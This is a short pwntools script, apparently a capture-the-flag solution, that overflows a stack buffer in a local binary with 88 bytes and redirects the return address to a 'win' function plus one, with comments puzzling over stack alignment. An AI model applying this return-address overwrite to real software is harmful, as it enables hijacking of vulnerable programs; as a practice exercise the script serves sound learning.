#!/usr/bin/env python3

from pwn import *

exe = ELF("./main")

context.binary = exe

r = process([exe.path])

r.send(b'A' * 88)

# +1 to skip pushing rbp .........??
# which would otherwise cause the stack pointer to be not a multiple of 16??!
# which makes a movaps not be aligned?!?! so confusing
r.sendline(p64(exe.symbols['win'] + 1))

print(r.readline().decode('utf-8'))
